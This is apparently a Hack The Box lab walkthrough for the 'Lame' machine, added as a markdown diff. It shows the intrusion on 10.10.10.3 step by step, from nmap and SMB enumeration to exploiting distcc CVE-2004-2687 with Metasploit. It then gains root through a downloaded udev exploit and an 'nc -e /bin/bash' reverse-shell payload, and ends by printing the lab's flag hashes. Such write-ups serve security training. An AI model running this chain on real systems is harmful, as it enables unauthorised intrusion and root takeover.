@@ -1,0 +1,380 @@
+## Discover & Exploit : 
+
+
+**1. root@kali:/tmp/lame/results/10.10.10.3/scans# cat _full_tcp_nmap.txt**
+```
+	 Nmap 7.80 scan initiated Wed Aug 26 21:01:59 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /tmp/lame/results/10.10.10.3/scans/_full_tcp_nmap.txt -oX /tmp/lame/results/10.10.10.3/scans/xml/_full_tcp_nmap.xml 10.10.10.3
+	Nmap scan report for 10.10.10.3
+	Host is up, received user-set (0.028s latency).
+	Scanned at 2020-08-26 21:02:00 EDT for 162s
+	Not shown: 65530 filtered ports
+	Reason: 65530 no-responses
+	PORT     STATE SERVICE     REASON         VERSION
+	21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
+	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.10.14.37
+	|      Logged in as ftp                                                                                                                                                                             
+	|      TYPE: ASCII                                                                                                                                                                                  
+	|      No session bandwidth limit                                                                                                                                                                   
+	|      Session timeout in seconds is 300                                                                                                                                                            
+	|      Control connection is plain text                                                                                                                                                             
+	|      Data connections will be plain text
+	|      vsFTPd 2.3.4 - secure, fast, stable
+	|_End of status
+	22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+	| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
+	|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+	|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+	139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+	3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+	Device type: WAP|remote management|general purpose
+	Running (JUST GUESSING): Linux 2.4.X|2.6.X (92%), Dell embedded (92%), Dell iDRAC 6 (92%), Linksys embedded (92%), Belkin embedded (90%), Control4 embedded (90%)
+	OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:dell:remote_access_card:6 cpe:/o:linux:linux_kernel:2.6 cpe:/o:dell:idrac6_firmware cpe:/h:linksys:wrv54g cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:belkin:n300
+	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+	Aggressive OS guesses: OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Linksys WRV54G WAP (92%), Linux 2.4.7 (91%), Linux 2.6.23 (91%), OpenWrt White Russian 0.9 (Linux 2.4.30) (90%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (90%)
+	No exact OS matches for host (test conditions non-ideal).
+	TCP/IP fingerprint:
+	SCAN(V=7.80%E=4%D=8/26%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F4706AA%P=x86_64-pc-linux-gnu)
+	SEQ(SP=B5%GCD=1%ISR=CC%TI=Z%II=I%TS=7)
+	OPS(O1=M54DST11NW5%O2=M54DST11NW5%O3=M54DNNT11NW5%O4=M54DST11NW5%O5=M54DST11NW5%O6=M54DST11)
+	WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)
+	ECN(R=Y%DF=Y%TG=40%W=16D0%O=M54DNNSNW5%CC=N%Q=)
+	T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+	T2(R=N)
+	T3(R=N)
+	T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+	U1(R=N)
+	IE(R=Y%DFI=N%TG=40%CD=S)
+	
+	Uptime guess: 0.015 days (since Wed Aug 26 20:43:38 2020)
+	Network Distance: 2 hops
+	TCP Sequence Prediction: Difficulty=181 (Good luck!)
+	IP ID Sequence Generation: All zeros
+	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	Host script results:
+	|_clock-skew: mean: -3d00h52m56s, deviation: 2h49m45s, median: -3d02h52m59s
+	| p2p-conficker: 
+	|   Checking for Conficker.C or higher...
+	|   Check 1 (port 59488/tcp): CLEAN (Timeout)
+	|   Check 2 (port 18832/tcp): CLEAN (Timeout)
+	|   Check 3 (port 9700/udp): CLEAN (Timeout)
+	|   Check 4 (port 40169/udp): CLEAN (Timeout)
+	|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+	| smb-os-discovery: 
+	|   OS: Unix (Samba 3.0.20-Debian)
+	|   Computer name: lame
+	|   NetBIOS computer name: 
+	|   Domain name: hackthebox.gr
+	|   FQDN: lame.hackthebox.gr
+	|_  System time: 2020-08-23T18:11:08-04:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+	|_smb2-time: Protocol negotiation failed (SMB2)
+	
+	TRACEROUTE (using port 22/tcp)
+	HOP RTT      ADDRESS
+	1   27.97 ms 10.10.14.1
+	2   28.67 ms 10.10.10.3
+	
+	Read data files from: /usr/bin/../share/nmap
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Wed Aug 26 21:04:42 2020 -- 1 IP address (1 host up) scanned in 163.80 seconds
+```	
+	
+**2. root@kali:/tmp/lame/results/10.10.10.3/scans# cat smbmap-list-contents.txt**
+```
+	[+] IP: 10.10.10.3:139  Name: 10.10.10.3                                        
+	        Disk                                                    Permissions     Comment
+	        ----                                                    -----------     -------
+	        print$                                                  NO ACCESS       Printer Drivers
+	        tmp                                                     READ, WRITE     oh noes!
+	        .\tmp\*
+	        dr--r--r--                0 Sun Aug 23 18:10:09 2020    .
+	        dw--w--w--                0 Sun May 20 14:36:11 2012    ..
+	        dr--r--r--                0 Sun Aug 23 17:45:58 2020    .ICE-unix
+	        dr--r--r--                0 Sun Aug 23 17:46:23 2020    .X11-unix
+	        fw--w--w--               11 Sun Aug 23 17:46:23 2020    .X0-lock
+	        fw--w--w--                0 Sun Aug 23 17:47:01 2020    5142.jsvc_up
+	        .\tmp\.X11-unix\*
+	        dr--r--r--                0 Sun Aug 23 17:46:23 2020    .
+	        dr--r--r--                0 Sun Aug 23 18:10:09 2020    ..
+	        fr--r--r--                0 Sun Aug 23 17:46:23 2020    X0
+	        opt                                                     NO ACCESS
+	        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+	        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+	[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+	        Disk                                                    Permissions     Comment
+	        ----                                                    -----------     -------
+	        print$                                                  NO ACCESS       Printer Drivers
+	        tmp                                                     READ, WRITE     oh noes!
+	        .\tmp\*
+	        dr--r--r--                0 Sun Aug 23 18:10:10 2020    .
+	        dw--w--w--                0 Sun May 20 14:36:11 2012    ..
+	        dr--r--r--                0 Sun Aug 23 17:45:58 2020    .ICE-unix
+	        dr--r--r--                0 Sun Aug 23 17:46:23 2020    .X11-unix
+	        fw--w--w--               11 Sun Aug 23 17:46:23 2020    .X0-lock
+	        fw--w--w--                0 Sun Aug 23 17:47:01 2020    5142.jsvc_up
+	        .\tmp\.X11-unix\*
+	        dr--r--r--                0 Sun Aug 23 17:46:23 2020    .
+	        dr--r--r--                0 Sun Aug 23 18:10:11 2020    ..
+	        fr--r--r--                0 Sun Aug 23 17:46:23 2020    X0
+	        opt                                                     NO ACCESS
+	        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+	        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+	[!] Authentication error on 10.10.10.3
+	[!] RPC Authentication error occurred
+	[!] Authentication error on 10.10.10.3
+```
+
+**3. root@kali:/tmp/lame/results/10.10.10.3/scans# cat tcp_3632_distcc_nmap.txt** 
+```
+Nmap 7.80 scan initiated Wed Aug 26 21:04:43 2020 as: nmap -vv --reason -Pn -sV -p 3632 --script=banner,distcc-cve2004-2687 --script-args=distcc-cve2004-2687.cmd=id -oN /tmp/lame/results/10.10.10.3/scans/tcp_3632_distcc_nmap.txt -oX /tmp/lame/results/10.10.10.3/scans/xml/tcp_3632_distcc_nmap.xml 10.10.10.3
+	Nmap scan report for 10.10.10.3
+	Host is up, received user-set (0.027s latency).
+	Scanned at 2020-08-26 21:04:43 EDT for 21s
+	
+	PORT     STATE SERVICE REASON         VERSION
+	3632/tcp open  distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+	| distcc-cve2004-2687: 
+	|   VULNERABLE:
+	|   distcc Daemon Command Execution
+	|     State: VULNERABLE (Exploitable)
+	|     IDs:  CVE:CVE-2004-2687
+	|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+	|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+	|       earlier. The vulnerability is the consequence of weak service configuration.
+	|       
+	|     Disclosure date: 2002-02-01
+	|     Extra information:
+	|       
+	|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+	|   
+	|     References:
+	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+	|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+	|_      https://distcc.github.io/security.html
+	
+	Read data files from: /usr/bin/../share/nmap
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Wed Aug 26 21:05:04 2020 -- 1 IP address (1 host up) scanned in 21.72 seconds
+```	
+**4. root@kali:~# searchsploit distcc**
+```	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                                                                                                               |  Path
+	                                                                                                                                                             | (/usr/share/exploitdb/)
+	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	DistCC Daemon - Command Execution (Metasploit)                                                                                                               | exploits/multiple/remote/9915.rb
+	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+```	
+	
+**5. msf5 > use exploit/unix/misc/distcc_exec**
+```
+	msf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
+	rhosts => 10.10.10.3
+	msf5 exploit(unix/misc/distcc_exec) > exploit 
+	
+	[*] Started reverse TCP double handler on 10.10.14.37:4444 
+	[*] Accepted the first client connection...
+	[*] Accepted the second client connection...
+	[*] Command: echo wjs8Rzki90D8MQ54;
+	[*] Writing to socket A
+	[*] Writing to socket B
+	[*] Reading from sockets...
+	[*] Reading from socket B
+	[*] B: "wjs8Rzki90D8MQ54\r\n"
+	[*] Matching...
+	[*] A is input...
+	[*] Command shell session 1 opened (10.10.14.37:4444 -> 10.10.10.3:51581) at 2020-08-28 21:16:59 -0400
+	
+	shell
+	[*] Trying to find binary(python) on target machine                                                                                                                                                   
+	[*] Found python at /usr/bin/python                                                                                                                                                                   
+	[*] Using `python` to pop up an interactive shell                                                                                                                                                     
+	/bin/bash                                                                                                                                                                                             
+	/bin/bash                                                                                                                                                                                             
+	daemon@lame:/tmp$ 
+```
+
+**6. daemon@lame:/tmp$ cd /home**
+```
+	cd /home
+	daemon@lame:/home$ ls -la
+	ls -la
+	total 24
+	drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
+	drwxr-xr-x 21 root    root    4096 May 20  2012 ..
+	drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
+	drwxr-xr-x  2 makis   makis   4096 Mar 14  2017 makis
+	drwxr-xr-x  2 service service 4096 Apr 16  2010 service
+	drwxr-xr-x  3    1001    1001 4096 May  7  2010 user
+	daemon@lame:/home$ cd makis
+	cd makis
+	daemon@lame:/home/makis$ ls -la
+	ls -la
+	total 28
+	drwxr-xr-x 2 makis makis 4096 Mar 14  2017 .
+	drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
+	-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
+	-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
+	-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
+	-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
+	-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
+	-rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt
+	daemon@lame:/home/makis$ cat user.txt
+	cat user.txt
+	69454a937d94f5f0225ea00acd2e84c5
+```	
+
+## Privilege Escalation :
+
+**1. daemon@lame:/tmp$ cat /etc/*-release**
+```
+	cat /etc/*-release
+	DISTRIB_ID=Ubuntu
+	DISTRIB_RELEASE=8.04
+	DISTRIB_CODENAME=hardy
+	DISTRIB_DESCRIPTION="Ubuntu 8.04"
+```	
+**2. uname -a**
+
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+	
+**3. root@kali:~# searchsploit linux kernel 2.6 ubuntu privilege escalation**
+```	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                                                                                                               |  Path
+	                                                                                                                                                             | (/usr/share/exploitdb/)
+	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation                 | exploits/linux/local/9545.c
+	Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV < 1.4.1 - Local Privilege Escalation (1)                                                                | exploits/linux/local/8478.sh
+	Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)                                                                   | exploits/linux/local/8572.c
+	Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privilege Escalation          | exploits/linux_x86-64/local/9083.c
+	Linux Kernel 2.6.32 (Ubuntu 10.04) - '/proc' Handling SUID Privilege Escalation                                                                              | exploits/linux/local/41770.txt
+	Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation                                                                     | exploits/linux/local/15704.c
+	Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)                                                         | exploits/linux/local/18411.c
+	Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                                                    | exploits/linux_x86/local/15916.c
+	Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                                                | exploits/linux/local/15944.c
+	Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                                                     | exploits/linux/local/14814.c
+	Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                                         | exploits/linux/local/17787.c
+	ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - 'xattr' Local Privilege Escalation                                                               | exploits/linux/local/12130.py
+	------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	
+Noticed that exploit 8572.c works 
+```	
+**4. root@kali:/tmp/valentine# python -m SimpleHTTPServer 8000**                                                                                                                                             
+	
+**5. daemon@lame:/tmp$ wget http://10.10.14.37:8000/8572.c**
+```
+wget http://10.10.14.37:8000/8572.c
+--18:33:25--  http://10.10.14.37:8000/8572.c
+	           => `8572.c'
+	Connecting to 10.10.14.37:8000... connected.
+	HTTP request sent, awaiting response... 200 OK
+	Length: 2,876 (2.8K) [text/plain]
+	
+	100%[====================================>] 2,876         --.--K/s             
+	
+	18:33:25 (4.84 MB/s) - `8572.c' saved [2876/2876]
+```	
+	
+**6. This exploit also requires a payload to be run , which is placed at /tmp**
+```
+We create payload run 
+	
+	#!/bin/bash
+	nc 10.10.14.37 6666 -e /bin/bash
+```	
+**7. daemon@la]e:/tmp$ wget http://10.10.14.37:8000/run** 
+```
+	wget http://10.10.14.37:8000/run
+	--18:37:16--  http://10.10.14.37:8000/run
+	           => `run'
+	Connecting to 10.10.14.37:8000... connected.
+	HTTP request sent, awaiting response... 200 OK
+	Length: 46 [application/octet-stream]
+	
+	100%[====================================>] 46            --.--K/s             
+	
+	18:37:17 (8.27 MB/s) - `run' saved [46/46]
+```	
+	
+**8. daemon@lame:/tmp$ gcc 8572.c -o expl**
+```   
+	gcc 8572.c -o expl
+	8572.c:110:28: warning: no newline at end of file
+	daemon@lame:/tmp$ chmod 777 run
+	chmod 777 run
+	daemon@lame:/tmp$ chmod 777 expl 
+	chmod 777 expl
+	daemon@lame:/tmp$ ps aux | grep udev 
+	ps aux | grep udev 
+	root      2688  0.0  0.1   2092   636 ?        S<s  17:59   0:00 /sbin/udevd --daemon
+	daemon    5469  0.0  0.1   1784   536 pts/2    RN+  18:34   0:00 grep udev
+	daemon@lame:/tmp$ cat /proc/net/netlink
+	cat /proc/net/netlink
+	sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+	ddf0c800 0   0      00000000 0        0        00000000 2
+	df7a1400 4   0      00000000 0        0        00000000 2
+	dd30b800 7   0      00000000 0        0        00000000 2
+	dd826600 9   0      00000000 0        0        00000000 2
+	dd82e400 10  0      00000000 0        0        00000000 2
+	ddf0cc00 15  0      00000000 0        0        00000000 2
+	df8b7800 15  2687   00000001 0        0        00000000 2
+	ddf15800 16  0      00000000 0        0        00000000 2
+	df91a000 18  0      00000000 0        0        00000000 2
+	daemon@lame:/tmp$ ./exploit 2687
+	./exploit 2687
+	bash: ./exploit: No such file or directory
+	daemon@lame:/tmp$ ./expl 2687
+	./expl 2687
+```
+	
+**9. root@kali:~# nc -nvlp 6666**
+```
+listening on [any] 6666 ...
+	connect to [10.10.14.37] from (UNKNOWN) [10.10.10.3] 54034
+	whoami
+	root
+```
+
+**10. python -c 'import pty; pty.spawn("/bin/bash")'**
+```
+	root@lame:/root# ls -la
+	ls -la
+	total 80
+	drwxr-xr-x 13 root root 4096 Aug 25 18:00 .
+	drwxr-xr-x 21 root root 4096 May 20  2012 ..
+	-rw-------  1 root root  373 Aug 25 18:00 .Xauthority
+	lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
+	-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
+	drwx------  3 root root 4096 May 20  2012 .config
+	drwx------  2 root root 4096 May 20  2012 .filezilla
+	drwxr-xr-x  5 root root 4096 Aug 25 18:00 .fluxbox
+	drwx------  2 root root 4096 May 20  2012 .gconf
+	drwx------  2 root root 4096 May 20  2012 .gconfd
+	drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
+	drwx------  4 root root 4096 May 20  2012 .mozilla
+	-rw-r--r--  1 root root  141 Oct 20  2007 .profile
+	drwx------  5 root root 4096 May 20  2012 .purple
+	-rwx------  1 root root    4 May 20  2012 .rhosts
+	drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
+	drwx------  2 root root 4096 Aug 25 18:00 .vnc
+	drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
+	-rwx------  1 root root  401 May 20  2012 reset_logs.sh
+	-rw-------  1 root root   33 Mar 14  2017 root.txt
+	-rw-r--r--  1 root root  118 Aug 25 18:00 vnc.log
+	root@lame:/root# cat root.txt
+	cat root.txt
+	92caac3be140ef409e45721348a4e9df
+```
